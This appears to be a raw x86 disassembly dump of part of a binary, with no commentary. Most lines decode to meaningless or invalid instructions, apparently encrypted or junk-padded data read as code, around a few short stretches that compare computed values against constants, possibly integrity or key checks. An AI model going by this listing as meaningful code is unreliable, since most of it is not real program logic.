  41a99f:	cmp    eax,0x7e53c592
  41a9a4:	jmp    0x999:0x2d3da6d8
  41a9ab:	in     eax,dx
  41a9ac:	or     DWORD PTR [edi-0x19],ebp
  41a9af:	mov    dl,0xea
  41a9b1:	(bad)  
  41a9b2:	stos   BYTE PTR es:[edi],al
  41a9b3:	les    esi,FWORD PTR [edi+0x6b753da9]
  41a9b9:	mov    al,ds:0x1deb1a29
  41a9be:	leave  
  41a9bf:	(bad)  
  41a9c1:	mov    bh,0x48
  41a9c3:	in     eax,dx
  41a9c4:	icebp  
  41a9c5:	pop    edi
  41a9c6:	jp     0x41a9be
  41a9c8:	adc    ebp,DWORD PTR es:[eax+0x50873298]
  41a9cf:	or     DWORD PTR [eax-0x66],esp
  41a9d2:	rcl    bl,0x49
  41a9d5:	mov    cl,0xd0
  41a9d7:	ror    BYTE PTR [edi],0x44
  41a9da:	pop    ecx
  41a9db:	xlat   BYTE PTR ds:[ebx]
  41a9dc:	xor    DWORD PTR [ecx+0xf7d186f],0xfffffffb
  41a9e3:	scas   eax,DWORD PTR es:[edi]
  41a9e4:	aam    0x77
  41a9e6:	mov    al,ds:0x346754c4
  41a9eb:	ins    BYTE PTR es:[edi],dx
  41a9ec:	xlat   BYTE PTR ds:[ebx]
  41a9ed:	rol    DWORD PTR [ecx+0x3a],1
  41a9f0:	scas   al,BYTE PTR es:[edi]
  41a9f1:	dec    edi
  41a9f2:	and    BYTE PTR [edi-0x56],al
  41a9f5:	sub    DWORD PTR [edx+eax*4+0x2fb6ebbb],0xffffffbf
  41a9fd:	iret   
  41a9fe:	dec    edx
  41a9ff:	fimul  DWORD PTR [ebx+0x31b17197]
  41aa05:	cmp    BYTE PTR [edx],ah
  41aa07:	mov    ecx,0x58bb6b1f
  41aa0c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aa0d:	cmp    al,0xac
  41aa0f:	jle    0x41aa7f
  41aa11:	retf   
  41aa12:	shl    DWORD PTR [ebx-0x7169e6c1],1
  41aa18:	ror    BYTE PTR [ebx],0x56
  41aa1b:	retf   
  41aa1c:	adc    al,0xa3
  41aa1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aa1f:	add    esi,esp
  41aa21:	mov    ecx,0xffaa33a9
  41aa26:	cli    
  41aa27:	and    eax,0x848725f8
  41aa2c:	sub    DWORD PTR [ecx],0xe
  41aa2f:	jg     0x41aaa1
  41aa31:	loopne 0x41a9d3
  41aa33:	ja     0x41a9d1
  41aa35:	xor    BYTE PTR [edx-0x3f2eae6b],al
  41aa3b:	push   ds
  41aa3c:	mov    edx,0x8ea20f96
  41aa41:	inc    edx
  41aa42:	push   edx
  41aa43:	push   esi
  41aa44:	xor    DWORD PTR [ebx+0x5b5740a3],edi
  41aa4a:	dec    edi
  41aa4b:	mov    dl,0x1
  41aa4d:	mov    WORD PTR [eax+edi*2+0x6],fs
  41aa51:	jecxz  0x41aa5f
  41aa53:	jge    0x41a9eb
  41aa55:	ins    BYTE PTR es:[edi],dx
  41aa56:	dec    eax
  41aa57:	retf   
  41aa58:	shl    BYTE PTR [edi+0x600df6e0],0xf0
  41aa5f:	or     eax,0x2978f8a2
  41aa64:	mov    eax,ds:0xb054cbee
  41aa69:	fisttp WORD PTR [ecx]
  41aa6b:	jmp    0x888a:0x842cea56
  41aa72:	dec    ebx
  41aa73:	cmp    al,0x1e
  41aa75:	mov    eax,ds:0xd64dbbc5
  41aa7a:	imul   eax,DWORD PTR [ecx],0x1cfbc635
  41aa80:	cmp    ebx,DWORD PTR [eax]
  41aa82:	dec    esp
  41aa83:	xchg   DWORD PTR [edi-0x78],esi
  41aa86:	sbb    ebx,eax
  41aa88:	adc    ebx,esp
  41aa8a:	mov    al,ds:0xbd02faf7
  41aa8f:	cli    
  41aa90:	js     0x41aa86
  41aa92:	lods   eax,DWORD PTR ds:[esi]
  41aa93:	or     al,dl
  41aa95:	xchg   ebp,eax
  41aa96:	xor    al,0x51
  41aa98:	jp     0x41aadb
  41aa9a:	(bad)  
  41aa9b:	pushf  
  41aa9c:	int    0x63
  41aa9e:	xor    esi,esi
  41aaa0:	bound  ebp,QWORD PTR [ebx+0x4c0c13b7]
  41aaa6:	pop    eax
  41aaa7:	and    esi,esp
  41aaa9:	sub    esp,DWORD PTR [esi]
  41aaab:	mul    ch
  41aaad:	outs   dx,DWORD PTR ds:[esi]
  41aaae:	aam    0xbb
  41aab0:	pop    ss
  41aab1:	pop    ebp
  41aab2:	sar    BYTE PTR [eax+edx*8+0x232fc62e],0xab
  41aaba:	nop
  41aabb:	and    BYTE PTR [ebp-0x55],0x65
  41aabf:	dec    eax
  41aac0:	mov    ds:0xd5320b8a,eax
  41aac5:	jmp    0xd6d9a855
  41aaca:	mov    eax,ds:0x365ccf13
  41aacf:	push   cs
  41aad0:	xchg   edx,eax
  41aad1:	sar    edi,1
  41aad3:	pop    esp
  41aad4:	call   0x11f77fd6
  41aad9:	(bad)  
  41aada:	repz (bad) 
  41aadc:	or     ecx,DWORD PTR [ebx-0x3]
  41aadf:	inc    ebx
  41aae0:	aaa    
  41aae1:	push   eax
  41aae2:	mov    ch,0x1a
  41aae4:	or     esp,eax
  41aae6:	pop    eax
  41aae7:	cmp    ebp,DWORD PTR [edx]
  41aae9:	je     0x41aaac
  41aaeb:	loop   0x41aab7
  41aaed:	adc    ecx,DWORD PTR [edi-0x77b56fcc]
  41aaf3:	sub    DWORD PTR [ebp-0x42],esi
  41aaf6:	lods   eax,DWORD PTR ds:[esi]
  41aaf7:	ds call 0xcd75:0x8dcee356
  41aaff:	repnz iret 
  41ab01:	and    eax,0x476f90b1
  41ab06:	mov    ebx,DWORD PTR [esp+0x34]
  41ab0a:	push   ebx
  41ab0b:	push   ecx
  41ab0c:	push   edx
  41ab0d:	push   eax
  41ab0e:	call   0x42205c
  41ab13:	mov    ecx,DWORD PTR [esp+0x48]
  41ab17:	mov    ebx,DWORD PTR [esp+0x4c]
  41ab1b:	push   ebx
  41ab1c:	push   ecx
  41ab1d:	push   edx
  41ab1e:	push   eax
  41ab1f:	call   0x42205c
  41ab24:	mov    ecx,DWORD PTR [esp+0x50]
  41ab28:	mov    ebx,DWORD PTR [esp+0x54]
  41ab2c:	add    eax,ecx
  41ab2e:	mov    ecx,DWORD PTR [esp+0x88]
  41ab35:	adc    edx,ebx
  41ab37:	mov    ebx,DWORD PTR [esp+0x8c]
  41ab3e:	cmp    ecx,eax
  41ab40:	jne    0x41af1d
  41ab46:	cmp    ebx,edx
  41ab48:	jmp    0x41af17
  41ab4d:	xchg   esi,eax
  41ab4e:	loope  0x41ab41
  41ab50:	gs pop esi
  41ab52:	fs jp  0x41ab2f
  41ab55:	aam    0x4d
  41ab57:	imul   esi,DWORD PTR [eax-0x4f9413fc],0x72
  41ab5e:	lahf   
  41ab5f:	push   ss
  41ab60:	sbb    BYTE PTR [edx+edx*1-0x73eee7e8],bh
  41ab67:	gs das 
  41ab69:	mov    edx,0xfd45ea04
  41ab6e:	les    eax,FWORD PTR [ebx]
  41ab70:	push   edi
  41ab71:	xor    ah,bl
  41ab73:	pushf  
  41ab74:	mov    bh,0xc9
  41ab76:	push   ebx
  41ab77:	fs call 0x179c:0xb9046c74
  41ab7f:	fs call 0xe80eb4c9
  41ab85:	add    esp,esp
  41ab87:	stc    
  41ab88:	mov    DWORD PTR [ecx-0x15],edx
  41ab8b:	xor    esp,DWORD PTR ds:0x2bafe01e
  41ab91:	mov    bh,0xf5
  41ab93:	fcomp  QWORD PTR [eax+0x3e5f611e]
  41ab99:	cs ds jae 0x41abd4
  41ab9d:	cmp    eax,0x14d97917
  41aba2:	cdq    
  41aba3:	es xchg edx,eax
  41aba5:	push   0x60
  41aba7:	pop    ebx
  41aba8:	or     eax,0x987e0f69
  41abad:	imul   BYTE PTR [ebp-0x48]
  41abb0:	loope  0x41abf4
  41abb2:	and    eax,0x7757f998
  41abb7:	call   0x90583da8
  41abbc:	xchg   edx,eax
  41abbd:	je     0x41ab7d
  41abbf:	jb     0x41abe4
  41abc1:	mov    eax,ds:0xa132f810
  41abc6:	arpl   cx,bx
  41abc8:	not    DWORD PTR [eax+0x15]
  41abcb:	adc    al,0x6e
  41abcd:	add    eax,0xc7de30a9
  41abd2:	xchg   esp,eax
  41abd3:	data16 test al,0x24
  41abd6:	xchg   edx,eax
  41abd7:	mov    eax,0xf47e314c
  41abdc:	addr16 inc eax
  41abde:	jnp    0x41ab79
  41abe0:	or     eax,0xe64efd7c
  41abe5:	ins    DWORD PTR es:[edi],dx
  41abe6:	ret    
  41abe7:	cdq    
  41abe8:	xor    edi,DWORD PTR [esi+eiz*2+0x33]
  41abec:	jae    0x41ac20
  41abee:	cs out 0xec,al
  41abf1:	or     al,0x66
  41abf3:	sbb    al,0xd1
  41abf5:	sub    al,ch
  41abf7:	stc    
  41abf8:	(bad)  
  41abf9:	ds cdq 
  41abfb:	ret    0x6f1c
  41abfe:	jle    0x41abbd
  41ac00:	(bad)  
  41ac01:	sub    esp,DWORD PTR ds:0x68db0225
  41ac07:	pop    esp
  41ac08:	sahf   
  41ac09:	cwde   
  41ac0a:	cmp    BYTE PTR [esp+esi*4-0x6cbe4a62],dl
  41ac11:	test   BYTE PTR [esi],dl
  41ac13:	xchg   ecx,eax
  41ac14:	sahf   
  41ac15:	lods   eax,DWORD PTR ds:[esi]
  41ac16:	xchg   ebx,esi
  41ac18:	xchg   DWORD PTR [esi+eiz*1],ecx
  41ac1b:	add    eax,0xe8973b06
  41ac20:	sahf   
  41ac21:	mov    ch,0xf0
  41ac23:	pop    ss
  41ac24:	test   BYTE PTR [esi+eiz*2+0x3],al
  41ac28:	lods   eax,DWORD PTR ds:[esi]
  41ac29:	pop    ebp
  41ac2a:	fucom  st(4)
  41ac2c:	popf   
  41ac2d:	pop    edi
  41ac2e:	cmp    BYTE PTR [edx],dh
  41ac30:	test   al,0x21
  41ac32:	pop    es
  41ac33:	sub    ebx,esp
  41ac35:	ret    0x15b6
  41ac38:	std    
  41ac39:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ac3a:	stos   DWORD PTR es:[edi],eax
  41ac3b:	mov    dh,0xa7
  41ac3d:	iret   
  41ac3e:	add    DWORD PTR [edi],0xfffffffc
  41ac41:	push   edx
  41ac42:	sbb    bh,BYTE PTR [ebp-0x172abba9]
  41ac48:	in     al,0x47
  41ac4a:	mov    ah,0x59
  41ac4c:	enter  0x218a,0xa5
  41ac50:	ret    
  41ac51:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ac52:	and    edi,DWORD PTR [eax+0x8f9285f]
  41ac58:	sbb    eax,0x4d43ea6d
  41ac5d:	repnz pop ebx
  41ac5f:	arpl   WORD PTR [ecx+edx*1-0xa3f6c4e],si
  41ac66:	repz sub eax,0xf8251a94
  41ac6c:	repz sub eax,0xa03010e
  41ac72:	sbb    al,0x51
  41ac74:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ac75:	mov    ebx,ds
  41ac77:	mov    ah,0x9e
  41ac79:	ror    ah,cl
  41ac7b:	xor    ebp,DWORD PTR [ebx+edi*4]
  41ac7e:	idiv   DWORD PTR [edx]
  41ac80:	and    BYTE PTR [ebx+eax*4+0x60],0x6c
  41ac85:	std    
  41ac86:	jmp    0x41acf0
  41ac88:	jo     0x41ac38
  41ac8a:	cld    
  41ac8b:	dec    esi
  41ac8c:	sub    BYTE PTR [esi+ebp*1],dh
  41ac8f:	div    DWORD PTR [eax-0x48081fa3]
  41ac95:	int3   
  41ac96:	mov    dl,0x70
  41ac98:	cmp    BYTE PTR [edi],bl
  41ac9a:	daa    
  41ac9b:	ins    BYTE PTR es:[edi],dx
  41ac9c:	add    BYTE PTR [eax],al
  41ac9e:	mov    ?,WORD PTR [ecx-0x56]
  41aca1:	xchg   ebx,eax
  41aca2:	dec    edx
  41aca3:	ss push edx
  41aca5:	or     BYTE PTR [ebx+0x29a71f14],bl
  41acab:	in     al,0x12
  41acad:	sub    eax,0x6c5d2c5f
  41acb2:	sub    ebx,esi
  41acb4:	icebp  
  41acb5:	rol    BYTE PTR [esi],cl
  41acb7:	stc    
  41acb8:	dec    edi
  41acb9:	xchg   cx,ax
  41acbb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41acbc:	or     DWORD PTR ds:0x57126f3e,0x6c
  41acc3:	xchg   edx,eax
  41acc4:	(bad)  
  41acc5:	adc    eax,0x933627d2
  41acca:	jp     0x41ad20
  41accc:	lods   al,BYTE PTR ds:[esi]
  41accd:	mov    dl,0x3a
  41accf:	dec    edx
  41acd0:	pop    ebx
  41acd1:	(bad)  
  41acd3:	xlat   BYTE PTR ds:[ebx]
  41acd4:	out    0x33,al
  41acd6:	add    ebp,0xf19ba2f1
  41acdc:	(bad)  
  41acde:	inc    eax
  41acdf:	inc    eax
  41ace0:	pop    edi
  41ace1:	add    eax,0xd0228b52
  41ace6:	rol    ah,0xb0
  41ace9:	cld    
  41acea:	jno    0x41ad4c
  41acec:	(bad)  
  41aced:	or     eax,DWORD PTR [ecx-0x2b]
  41acf0:	push   edi
  41acf1:	add    DWORD PTR [esp+edx*8],esi
  41acf4:	jbe    0x41ac83
  41acf6:	sbb    al,0x38
  41acf8:	test   ch,dl
  41acfa:	jge    0x41ad59
  41acfc:	push   ss
  41acfd:	jg     0x41accd
  41acff:	(bad)  
  41ad00:	fstp   st(4)
  41ad02:	pop    es
  41ad03:	sbb    al,0xd4
  41ad05:	call   0xbe9a:0x1e06e17
  41ad0c:	ds pop edx
  41ad0e:	jge    0x41ad12
  41ad10:	in     al,dx
  41ad11:	jb     0x41ad4d
  41ad13:	push   cs
  41ad14:	out    0xed,al
  41ad16:	daa    
  41ad17:	test   eax,0x3dd8ac31
  41ad1c:	mov    WORD PTR [edi+esi*4+0x2],?
  41ad20:	add    DWORD PTR ds:0x30f382da,ebx
  41ad26:	shr    DWORD PTR [edi-0x7f785f62],1
  41ad2c:	iret   
  41ad2d:	mov    ah,0x83
  41ad2f:	adc    bh,BYTE PTR [ebx-0x63]
  41ad32:	imul   eax,DWORD PTR [eax+0x28343a28],0xffffff87
  41ad39:	mov    BYTE PTR [edi+0x71],dl
  41ad3c:	cld    
  41ad3d:	out    0xaa,eax
  41ad3f:	sub    al,0x52
  41ad41:	add    bl,BYTE PTR [esi-0x1a9bff27]
  41ad47:	push   es
  41ad48:	sahf   
  41ad49:	leave  
  41ad4a:	add    DWORD PTR [eax-0x57b7b47c],edi
  41ad50:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ad51:	jmp    0x41ad3f
  41ad53:	sub    DWORD PTR [ecx],0xffffffa9
  41ad56:	ret    
  41ad57:	ficomp DWORD PTR [eax+0x1c91ac25]
  41ad5d:	mov    ebp,0xadc8c44b
  41ad62:	cmp    BYTE PTR [eax],ch
  41ad64:	jmp    0x303b:0x44b7f629
  41ad6b:	xor    al,0x8c
  41ad6d:	sub    al,BYTE PTR [ebp+0x47077145]
  41ad73:	mov    al,0xe0
  41ad75:	add    eax,0x89bee96c
  41ad7a:	fild   WORD PTR [ecx]
  41ad7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ad7d:	test   al,0xa4
  41ad7f:	push   ebp
  41ad80:	sub    al,BYTE PTR [esi+0x46]
  41ad83:	ins    BYTE PTR es:[edi],dx
  41ad84:	jecxz  0x41ae05
  41ad86:	lods   al,BYTE PTR ds:[esi]
  41ad87:	cmp    DWORD PTR [edi-0x23943990],eax
  41ad8d:	ficom  DWORD PTR [ebx+ebp*1-0x72]
  41ad91:	fild   WORD PTR [ebx-0x76]
  41ad94:	sub    BYTE PTR [esp+ebp*4],ch
  41ad97:	shl    dh,cl
  41ad99:	jg     0x41ad71
  41ad9b:	(bad)  
  41ad9c:	outs   dx,DWORD PTR ds:[esi]
  41ad9d:	ss pop es
  41ad9f:	or     al,0x95
  41ada1:	out    0xe7,al
  41ada3:	repz cmp BYTE PTR [esi+0x503cb303],bh
  41adaa:	out    dx,eax
  41adab:	dec    esp
  41adac:	(bad)  
  41adad:	aam    0xc
  41adaf:	movups xmm1,XMMWORD PTR [eax+0x5]
  41adb3:	pop    es
  41adb4:	adc    eax,0x67b4990d
  41adb9:	add    ebx,DWORD PTR [ecx-0x5a]
  41adbc:	inc    ecx
  41adbd:	and    al,0xd9
  41adbf:	jne    0x41ad5f
  41adc1:	push   0xd88af9e6
  41adc6:	xor    DWORD PTR [ebx+0x1c],ebx
  41adc9:	out    0x43,al
  41adcb:	mov    ah,0x83
  41adcd:	pop    es
  41adce:	and    eax,0xeeacebd2
  41add3:	inc    si
  41add5:	pop    es
  41add6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41add7:	(bad)  
  41add8:	nop
  41add9:	xchg   al,al
  41addb:	push   ebp
  41addc:	or     al,0xf8
  41adde:	int    0x7f
  41ade0:	repz fs mov dl,0xc
  41ade4:	sar    DWORD PTR es:[esi+0x491677fc],1
  41adeb:	push   eax
  41adec:	repz push ds
  41adee:	cmc    
  41adef:	add    eax,0x8121cf22
  41adf4:	cli    
  41adf5:	xchg   ebp,eax
  41adf6:	cmp    bh,dl
  41adf8:	mov    esi,DWORD PTR [ecx-0x3c3b8b4e]
  41adfe:	das    
  41adff:	test   BYTE PTR [ecx-0x4438b6ef],ch
  41ae05:	mov    al,0x8d
  41ae07:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ae08:	dec    ecx
  41ae09:	hlt    
  41ae0a:	addr16 cmc 
  41ae0c:	inc    ebp
  41ae0d:	cli    
  41ae0e:	out    dx,al
  41ae0f:	lods   al,BYTE PTR ds:[esi]
  41ae10:	mov    ebp,0x58d881cc
  41ae15:	xchg   edi,eax
  41ae16:	popa   
  41ae17:	enter  0xff9a,0xe4
  41ae1b:	sub    DWORD PTR [edx-0x14],eax
  41ae1e:	int3   
  41ae1f:	ins    DWORD PTR es:[edi],dx
  41ae20:	mul    DWORD PTR [eax+ecx*1]
  41ae23:	cmp    al,BYTE PTR [eax]
  41ae25:	hlt    
  41ae26:	pushf  
  41ae27:	xchg   edx,eax
  41ae28:	ins    DWORD PTR es:[edi],dx
  41ae29:	mov    ah,0x87
  41ae2b:	xchg   esp,eax
  41ae2c:	pop    esp
  41ae2d:	loope  0x41ae74
  41ae2f:	jp     0x41ae6d
  41ae31:	fistp  WORD PTR ds:[eax-0x27]
  41ae35:	adc    al,BYTE PTR [ecx-0x7e3283c5]
  41ae3b:	jg     0x41ae4e
  41ae3d:	pop    es
  41ae3e:	es push esp
  41ae40:	stos   DWORD PTR es:[edi],eax
  41ae41:	pop    es
  41ae42:	mov    edx,0x2874a2c9
  41ae47:	sbb    al,0x8d
  41ae49:	inc    ecx
  41ae4a:	mov    ebp,0xea0781c5
  41ae4f:	sub    eax,0xbabac72e
  41ae54:	add    eax,0x32d5a140
  41ae59:	sub    DWORD PTR [ebp+0x5d],esi
  41ae5c:	stc    
  41ae5d:	fwait
  41ae5e:	xor    BYTE PTR ds:0x32826a70,0x3b
  41ae65:	adc    bh,BYTE PTR [ebx]
  41ae67:	retf   0xd6f3
  41ae6a:	mov    bl,0x19
  41ae6c:	pop    esp
  41ae6d:	adc    al,0xc5
  41ae6f:	aas    
  41ae70:	xchg   esp,eax
  41ae71:	fwait
  41ae72:	dec    esi
  41ae73:	out    dx,al
  41ae74:	adc    eax,0x624a4560
  41ae79:	test   eax,0xe2e742ac
  41ae7e:	pop    esi
  41ae7f:	ret    
  41ae80:	xor    edi,0x6d
  41ae83:	mov    ch,BYTE PTR [esi+0x6e51dc90]
  41ae89:	loop   0x41ae0f
  41ae8b:	(bad)  
  41ae8c:	cmp    DWORD PTR [ecx+0x6b],esi
  41ae8f:	or     al,0x35
  41ae91:	jl     0x41ae89
  41ae93:	test   WORD PTR [ebx],bx
  41ae96:	hlt    
  41ae97:	pop    ss
  41ae98:	loopne 0x41ae22
  41ae9a:	fst    QWORD PTR [edx]
  41ae9c:	jne    0x41ae5d
  41ae9e:	cdq    
  41ae9f:	xor    dl,BYTE PTR gs:[edi-0x4f]
  41aea3:	aam    0xb3
  41aea5:	or     al,ah
  41aea7:	and    ebp,0x482e5085
  41aead:	and    DWORD PTR [ebp+0x2b],esp
  41aeb0:	add    DWORD PTR [ecx],ebx
  41aeb2:	add    BYTE PTR [ecx],ch
  41aeb4:	jmp    0x12ce:0x75e54989
  41aebb:	cdq    
  41aebc:	inc    ecx
  41aebd:	test   BYTE PTR [eax+edx*4-0x32],ah
  41aec1:	mov    dh,0xa8
  41aec3:	jmp    0x87b4:0xa3689edf
  41aeca:	mov    dh,BYTE PTR [ebx+edi*4-0x3a10eeda]
  41aed1:	test   BYTE PTR [ebx+0x7e598ca],dl
  41aed7:	xchg   esi,eax
  41aed8:	mov    fs,WORD PTR [eax-0xd1f1b4f]
  41aede:	xor    bl,ch
  41aee0:	cmp    BYTE PTR ds:0x8908aa5d,cl
  41aee6:	add    esp,DWORD PTR [esi]
  41aee8:	add    cl,bl
  41aeea:	mul    BYTE PTR [ebx+0x2d618f51]
  41aef0:	inc    edi
  41aef1:	inc    ebx
  41aef2:	daa    
  41aef3:	ds call 0x221:0xde64f326
  41aefb:	pop    esi
  41aefc:	ins    DWORD PTR es:[edi],dx
  41aefd:	lock mov ds:0x82e38637,al
  41af03:	inc    esp
  41af04:	pop    edx
  41af05:	popf   
  41af06:	cli    
  41af07:	sbb    eax,0xe36f79fb
  41af0c:	in     eax,0xac
  41af0e:	push   esp
  41af0f:	adc    BYTE PTR [ebx+0x3144209e],cl
  41af15:	dec    esp
  41af16:	sbb    ecx,DWORD PTR [edi]
  41af18:	test   BYTE PTR [edx+ebp*1],al
  41af1b:	add    BYTE PTR [eax],al
  41af1d:	mov    eax,DWORD PTR [esp+0x40]
  41af21:	mov    edx,DWORD PTR [esp+0x18]
  41af25:	xor    ecx,ecx
  41af27:	shld   ecx,eax,0x2
  41af2b:	shl    eax,0x2
  41af2e:	mov    ebx,0xca79a575
  41af33:	mov    DWORD PTR [esp+0x10],edx
  41af37:	mov    edx,DWORD PTR [esp+0x1c]
  41af3b:	xor    eax,ebx
  41af3d:	xor    ecx,esi
  41af3f:	mov    DWORD PTR [esp+0x14],edx
  41af43:	cmp    eax,DWORD PTR [esp+0x10]
  41af47:	jne    0x41af55
  41af4d:	cmp    ecx,edx
  41af4f:	je     0x41d926
  41af55:	mov    eax,DWORD PTR [esp+0x44]
  41af59:	cmp    eax,0xa4069aaa
  41af5e:	je     0x41b750
  41af64:	mov    edx,DWORD PTR [esp+0x18]
  41af68:	mov    eax,DWORD PTR [esp+0x1c]
  41af6c:	xor    eax,esi
  41af6e:	jmp    0x41b33d
  41af73:	popa   
  41af74:	cmp    edx,ecx
  41af76:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41af77:	stos   DWORD PTR es:[edi],eax
  41af78:	and    bl,BYTE PTR [esi+0x3a]
  41af7b:	ins    DWORD PTR es:[edi],dx
  41af7c:	jnp    0x41af01
  41af7e:	jl     0x41afd1
  41af80:	mov    DWORD PTR ds:0x1697176a,esi
  41af86:	sbb    BYTE PTR [edx+edx*1-0x6560e7e8],bh
  41af8d:	jp     0x41afb5
  41af8f:	push   0x28
  41af91:	push   ecx
  41af92:	jmp    0x41afe9
  41af94:	add    ebp,edi
  41af96:	lahf   
  41af97:	inc    ebx
  41af98:	test   DWORD PTR [ebx+ebp*8-0x78],edi
  41af9c:	div    bl
  41af9e:	out    0xc,al
  41afa0:	mov    ds:0xe3ada826,al
  41afa5:	call   0x4e56:0x90c1c0aa
  41afac:	mov    bl,0x7d
  41afae:	jecxz  0x41afdf
  41afb0:	stos   DWORD PTR es:[edi],eax
  41afb1:	stc    
  41afb2:	ret    
  41afb3:	sub    al,dl
  41afb5:	xor    ecx,DWORD PTR [edx+0x19]
  41afb8:	inc    ebp
  41afb9:	add    DWORD PTR gs:[edx+0x4d54c86],ebp
  41afc0:	or     cl,BYTE PTR ds:0xed8214b5
  41afc6:	or     ebp,ebp
  41afc8:	mov    al,0xa9
  41afca:	jb     0x41af6d
  41afcc:	js     0x41b032
  41afce:	mov    bh,0x2c
  41afd0:	ins    BYTE PTR es:[edi],dx
  41afd1:	pop    edi
  41afd2:	push   edi
  41afd3:	fdiv   st(6),st
  41afd5:	loop   0x41afc0
  41afd7:	mov    bh,BYTE PTR [esi+eax*4]
  41afda:	into   
  41afdb:	inc    ebp
  41afdc:	imul   ebx,ecx,0x879b5131
  41afe2:	ret    0xcce3
  41afe5:	dec    ebp
  41afe6:	sti    
  41afe7:	popf   
  41afe8:	sar    esp,cl
  41afea:	bnd jmp 0x355bfc65
  41aff0:	jno    0x41af8b
  41aff2:	pop    ecx
  41aff3:	xor    cl,BYTE PTR [eax+ecx*1]
  41aff6:	js     0x41afb0
  41aff8:	out    dx,al
  41aff9:	popf   
  41affa:	icebp  
  41affb:	mov    dl,0x7f
  41affd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41affe:	sbb    ch,BYTE PTR [edi]
  41b000:	fidiv  DWORD PTR [eax+0x79]
  41b003:	ss loop 0x41affc
  41b006:	iret   
  41b007:	lods   eax,DWORD PTR ds:[esi]
  41b008:	cmp    al,0xac
  41b00a:	daa    
  41b00b:	add    esp,DWORD PTR [ecx-0x4d]
  41b00e:	es mov esi,0x8c64baa5
  41b014:	inc    eax
  41b015:	dec    ebx
  41b016:	or     DWORD PTR [ebp+0x7e827b60],0xfffffff6
  41b01d:	pop    ds
  41b01e:	les    esp,FWORD PTR [edi+0x60]
  41b021:	ds mov ecx,0x9058d1a3
  41b027:	sbb    DWORD PTR [edx+0x62],ebp
  41b02a:	and    DWORD PTR [ebp-0x31d03631],eax
  41b030:	(bad)  
  41b031:	mov    dh,0x58
  41b033:	sbb    cl,BYTE PTR [edi+0x36b79856]
  41b039:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b03a:	sub    DWORD PTR [ebp+0xf],ebp
  41b03d:	cwde   
  41b03e:	lds    eax,FWORD PTR [ecx-0x35eb2b04]
  41b044:	add    al,0x42
  41b046:	or     BYTE PTR [ebx+0x12f9515d],al
  41b04c:	mov    ecx,0x972d3a82
  41b051:	jo     0x41b038
  41b053:	jb     0x41b0b1
  41b055:	cmp    al,0x58
  41b057:	sub    ah,ch
  41b059:	retf   0x9917
  41b05c:	and    edi,eax
  41b05e:	cdq    
  41b05f:	in     al,dx
  41b060:	mov    dl,0x6
  41b062:	imul   edi,DWORD PTR ss:[ebx],0xffffffa9
  41b066:	lock jmp 0x2e27ea0e
  41b06c:	das    
  41b06d:	js     0x41b015
  41b06f:	jecxz  0x41b028
  41b071:	mov    edx,0x85b94dc8
  41b076:	lea    ebp,[eax+0x81f80ed]
  41b07c:	lea    edi,[esi]
  41b07e:	(bad)  
  41b07f:	sub    ah,al
  41b081:	in     al,dx
  41b082:	scas   eax,DWORD PTR es:[edi]
  41b083:	inc    ebx
  41b084:	lods   al,BYTE PTR ds:[esi]
  41b085:	push   edi
  41b086:	inc    esp
  41b087:	mov    ah,0x63
  41b089:	dec    ecx
  41b08a:	jp     0x41b055
  41b08c:	sbb    ch,BYTE PTR [ecx+0x856ee7c]
  41b092:	adc    ecx,DWORD PTR [esi]
  41b094:	pop    es
  41b095:	jae    0x41b0ee
  41b097:	rol    DWORD PTR [edx+0x33],cl
  41b09a:	cwde   
  41b09b:	lods   al,BYTE PTR ds:[esi]
  41b09c:	sub    ebx,edi
  41b09e:	push   cs
  41b09f:	push   edx
  41b0a0:	pop    ss
  41b0a1:	mov    bh,0xa1
  41b0a3:	outs   dx,DWORD PTR es:[esi]
  41b0a5:	pop    ebx
  41b0a6:	addr16 push ebx
  41b0a8:	mov    eax,ds:0x5407dd19
  41b0ad:	jecxz  0x41b06a
  41b0af:	fnsetpm(287 only) 
  41b0b1:	aaa    
  41b0b2:	imul   esp,DWORD PTR [edi+eax*8+0x2f80c58d],0x77
  41b0ba:	ds pop eax
  41b0bc:	jg     0x41b0b3
  41b0be:	ja     0x41b071
  41b0c0:	loope  0x41b126
  41b0c2:	inc    ebx
  41b0c3:	sbb    dl,BYTE PTR [ebx+ebx*2+0x2f791908]
  41b0ca:	sub    eax,0x7ca2e34b
  41b0cf:	cwde   
  41b0d0:	cmp    BYTE PTR [edi+0xb8c494],cl
  41b0d6:	mov    ebx,0xab1e53d3
  41b0db:	jg     0x41b107
  41b0dd:	xchg   esi,eax
  41b0de:	sub    DWORD PTR [esi-0x5475bead],ebx
  41b0e4:	popf   
  41b0e5:	mov    bh,0x1d
  41b0e7:	mov    ebp,0x96aa259
  41b0ec:	or     al,0xea
  41b0ee:	mov    es,WORD PTR [ebx-0x3a25cfa6]
  41b0f4:	mov    DWORD PTR [edx],edx
  41b0f6:	xor    eax,DWORD PTR [edx]
  41b0f8:	(bad)  
  41b0f9:	mov    edi,ecx
  41b0fb:	dec    eax
  41b0fc:	rol    BYTE PTR [esi+0x4d8198d7],cl
  41b102:	inc    esi
  41b103:	cmp    DWORD PTR [eax],ebp
  41b105:	mov    ebp,edx
  41b107:	(bad)  
  41b108:	jle    0x41b0e1
  41b10a:	add    BYTE PTR [edi],ah
  41b10c:	jbe    0x41b106
  41b10e:	ror    DWORD PTR [ebx+0x52],cl
  41b111:	jp     0x41b0b5
  41b113:	and    ah,BYTE PTR [ecx]
  41b115:	test   al,0x4
  41b117:	int    0x11
  41b119:	and    al,0xa1
  41b11b:	sbb    eax,edx
  41b11d:	and    ebp,DWORD PTR [esi]
  41b11f:	jmp    0xa7161c38
  41b124:	sbb    BYTE PTR [eax],0x97
  41b127:	scas   al,BYTE PTR es:[edi]
  41b128:	shr    ah,0xdf
